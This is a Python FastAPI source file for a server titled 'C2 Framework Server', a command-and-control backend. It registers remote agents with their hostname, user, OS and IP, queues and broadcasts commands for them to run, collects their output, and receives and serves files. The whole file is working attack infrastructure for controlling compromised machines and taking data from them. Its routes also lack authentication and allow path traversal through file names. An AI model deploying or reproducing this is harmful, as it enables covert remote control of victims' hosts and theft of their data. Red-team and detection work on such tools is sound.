import sys
import os
import time
import json

# Add project root to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from fastapi import FastAPI, UploadFile, File, Form, Request
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from sqlalchemy import create_engine, Column, String, Integer, Text
from sqlalchemy.orm import sessionmaker, declarative_base
from typing import Optional

from encryption.crypto import encrypt_message, decrypt_message, sign_message, verify_signature

# ── App Setup ────────────────────────────────────────────────────

app = FastAPI(title="C2 Framework Server", version="2.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── Database Setup ───────────────────────────────────────────────

DB_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "c2server.db")
engine = create_engine(f"sqlite:///{DB_PATH}", connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(bind=engine)
Base = declarative_base()

# Upload directory
UPLOAD_DIR = os.path.join(os.path.dirname(__file__), "..", "data")
os.makedirs(UPLOAD_DIR, exist_ok=True)


# ── Database Tables ──────────────────────────────────────────────

class AgentDB(Base):
    __tablename__ = "agents"
    agent_id = Column(String, primary_key=True)
    hostname = Column(String)
    username = Column(String)
    os_name = Column(String)
    ip_address = Column(String, default="")
    registered_at = Column(Integer, default=0)
    last_seen = Column(Integer, default=0)


class CommandDB(Base):
    __tablename__ = "commands"
    id = Column(Integer, primary_key=True, index=True, autoincrement=True)
    agent_id = Column(String)
    command = Column(String)
    timestamp = Column(Integer, default=0)
    status = Column(String, default="pending")


class OutputDB(Base):
    __tablename__ = "outputs"
    id = Column(Integer, primary_key=True, index=True, autoincrement=True)
    agent_id = Column(String)
    command = Column(String, default="")
    output = Column(Text)
    timestamp = Column(Integer, default=0)


class LogDB(Base):
    __tablename__ = "logs"
    id = Column(Integer, primary_key=True, index=True, autoincrement=True)
    timestamp = Column(Integer)
    agent_id = Column(String, default="")
    event_type = Column(String)
    detail = Column(Text)


Base.metadata.create_all(engine)


# ── Helper: Log an Event ─────────────────────────────────────────

def log_event(agent_id: str, event_type: str, detail: str):
    db = SessionLocal()
    entry = LogDB(
        timestamp=int(time.time()),
        agent_id=agent_id,
        event_type=event_type,
        detail=detail
    )
    db.add(entry)
    db.commit()
    db.close()


# ── Pydantic Models ──────────────────────────────────────────────

class Agent(BaseModel):
    agent_id: str
    hostname: str
    username: str
    os_name: str
    ip_address: str = ""

class Command(BaseModel):
    agent_id: str
    command: str

class BroadcastCommand(BaseModel):
    command: str

class Output(BaseModel):
    agent_id: str
    command: str = ""
    output: str

class Heartbeat(BaseModel):
    agent_id: str

class EncryptedPayload(BaseModel):
    ciphertext: str
    signature: str


# ── Routes: Home ─────────────────────────────────────────────────

@app.get("/")
async def home():
    return {"message": "C2 Server Running", "version": "2.0"}


# ── Routes: Agent Registration ───────────────────────────────────

@app.post("/register")
async def register(agent: Agent):
    db = SessionLocal()
    existing = db.query(AgentDB).filter(AgentDB.agent_id == agent.agent_id).first()

    now = int(time.time())

    if not existing:
        new_agent = AgentDB(
            agent_id=agent.agent_id,
            hostname=agent.hostname,
            username=agent.username,
            os_name=agent.os_name,
            ip_address=agent.ip_address,
            registered_at=now,
            last_seen=now
        )
        db.add(new_agent)
        db.commit()
        log_event(agent.agent_id, "register", f"New agent: {agent.hostname} ({agent.username})")
    else:
        existing.last_seen = now
        existing.hostname = agent.hostname
        existing.username = agent.username
        existing.os_name = agent.os_name
        existing.ip_address = agent.ip_address
        db.commit()
        log_event(agent.agent_id, "re-register", f"Agent reconnected: {agent.hostname}")

    db.close()
    return {"message": "agent registered"}


# ── Routes: Heartbeat ────────────────────────────────────────────

@app.post("/heartbeat")
async def heartbeat(hb: Heartbeat):
    db = SessionLocal()
    agent = db.query(AgentDB).filter(AgentDB.agent_id == hb.agent_id).first()

    if agent:
        agent.last_seen = int(time.time())
        db.commit()

    db.close()
    return {"message": "heartbeat received"}


# ── Routes: Commands ─────────────────────────────────────────────

@app.post("/command")
async def send_command(cmd: Command):
    db = SessionLocal()
    new_command = CommandDB(
        agent_id=cmd.agent_id,
        command=cmd.command,
        timestamp=int(time.time()),
        status="pending"
    )
    db.add(new_command)
    db.commit()
    db.close()

    log_event(cmd.agent_id, "command", f"Queued: {cmd.command}")
    return {"message": "command stored"}


@app.post("/broadcast")
async def broadcast(cmd: BroadcastCommand):
    db = SessionLocal()
    agents = db.query(AgentDB).all()
    now = int(time.time())

    for agent in agents:
        new_command = CommandDB(
            agent_id=agent.agent_id,
            command=cmd.command,
            timestamp=now,
            status="pending"
        )
        db.add(new_command)

    db.commit()
    db.close()

    log_event("*", "broadcast", f"Broadcast: {cmd.command}")
    return {"message": f"command broadcast to {len(agents)} agents"}


@app.get("/get_command/{agent_id}")
async def get_command(agent_id: str):
    db = SessionLocal()
    command = db.query(CommandDB).filter(
        CommandDB.agent_id == agent_id,
        CommandDB.status == "pending"
    ).first()

    if command:
        cmd_text = command.command
        command.status = "sent"
        db.commit()
        db.close()
        return {"command": cmd_text}

    db.close()
    return {"command": ""}


# ── Routes: Output ───────────────────────────────────────────────

@app.post("/send_output")
async def receive_output(out: Output):
    db = SessionLocal()
    new_output = OutputDB(
        agent_id=out.agent_id,
        command=out.command,
        output=out.output,
        timestamp=int(time.time())
    )
    db.add(new_output)
    db.commit()
    db.close()

    log_event(out.agent_id, "output", f"Output for: {out.command[:50]}")
    return {"message": "output stored"}


@app.get("/outputs")
async def outputs():
    db = SessionLocal()
    data = db.query(OutputDB).order_by(OutputDB.timestamp.desc()).limit(100).all()
    results = []
    for d in data:
        results.append({
            "id": d.id,
            "agent_id": d.agent_id,
            "command": d.command,
            "output": d.output,
            "timestamp": d.timestamp
        })
    db.close()
    return results


# ── Routes: Agent Status ─────────────────────────────────────────

@app.get("/agents")
async def list_agents():
    db = SessionLocal()
    agents = db.query(AgentDB).all()
    current = int(time.time())
    result = []

    for a in agents:
        status = "online" if current - a.last_seen < 30 else "offline"
        result.append({
            "agent_id": a.agent_id,
            "hostname": a.hostname,
            "username": a.username,
            "os": a.os_name,
            "ip_address": a.ip_address,
            "status": status,
            "last_seen": a.last_seen,
            "registered_at": a.registered_at
        })

    db.close()
    return result


@app.get("/status")
async def status():
    db = SessionLocal()
    agents = db.query(AgentDB).all()
    current = int(time.time())
    result = {}

    for a in agents:
        result[a.agent_id] = "online" if current - a.last_seen < 30 else "offline"

    db.close()
    return result


# ── Routes: History ──────────────────────────────────────────────

@app.get("/history")
async def history(agent_id: Optional[str] = None):
    db = SessionLocal()

    if agent_id:
        data = db.query(OutputDB).filter(OutputDB.agent_id == agent_id).order_by(OutputDB.timestamp.desc()).all()
    else:
        data = db.query(OutputDB).order_by(OutputDB.timestamp.desc()).limit(200).all()

    results = []
    for d in data:
        results.append({
            "agent_id": d.agent_id,
            "command": d.command,
            "output": d.output,
            "timestamp": d.timestamp
        })

    db.close()
    return results


# ── Routes: Logs ─────────────────────────────────────────────────

@app.get("/logs")
async def get_logs(limit: int = 50):
    db = SessionLocal()
    data = db.query(LogDB).order_by(LogDB.timestamp.desc()).limit(limit).all()
    results = []
    for d in data:
        results.append({
            "id": d.id,
            "timestamp": d.timestamp,
            "agent_id": d.agent_id,
            "event_type": d.event_type,
            "detail": d.detail
        })
    db.close()
    return results


# ── Routes: File Upload / Download ───────────────────────────────

@app.post("/upload")
async def upload_file(file: UploadFile = File(...), agent_id: str = Form("")):
    filepath = os.path.join(UPLOAD_DIR, file.filename)
    contents = await file.read()

    with open(filepath, "wb") as f:
        f.write(contents)

    log_event(agent_id, "upload", f"File uploaded: {file.filename} ({len(contents)} bytes)")
    return {"message": f"File {file.filename} uploaded", "size": len(contents)}


@app.get("/download/{filename}")
async def download_file(filename: str):
    filepath = os.path.join(UPLOAD_DIR, filename)
    if os.path.exists(filepath):
        return FileResponse(filepath, filename=filename)
    return JSONResponse(status_code=404, content={"error": "File not found"})


# ── Routes: Agent Management ─────────────────────────────────────

@app.delete("/agent/{agent_id}")
async def delete_agent(agent_id: str):
    db = SessionLocal()

    db.query(AgentDB).filter(AgentDB.agent_id == agent_id).delete()
    db.query(CommandDB).filter(CommandDB.agent_id == agent_id).delete()
    db.query(OutputDB).filter(OutputDB.agent_id == agent_id).delete()
    db.query(LogDB).filter(LogDB.agent_id == agent_id).delete()
    db.commit()
    db.close()

    log_event("server", "delete_agent", f"Removed agent: {agent_id}")
    return {"message": f"Agent {agent_id} removed"}


# ── Routes: Dashboard Data ───────────────────────────────────────

@app.get("/dashboard")
async def dashboard():
    db = SessionLocal()
    agents = db.query(AgentDB).all()
    current = int(time.time())

    online = sum(1 for a in agents if current - a.last_seen < 30)
    offline = len(agents) - online

    pending = db.query(CommandDB).filter(CommandDB.status == "pending").count()

    db.close()
    return {
        "total_agents": len(agents),
        "online_agents": online,
        "offline_agents": offline,
        "pending_commands": pending,
        "server_uptime": current
    }


# ── Routes: Serve Dashboard HTML ─────────────────────────────────

@app.get("/dashboard_page", response_class=HTMLResponse)
async def dashboard_page():
    html_path = os.path.join(os.path.dirname(__file__), "..", "dashboard", "dashboard.html")
    if os.path.exists(html_path):
        with open(html_path, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return HTMLResponse(content="<h1>Dashboard not found</h1>", status_code=404)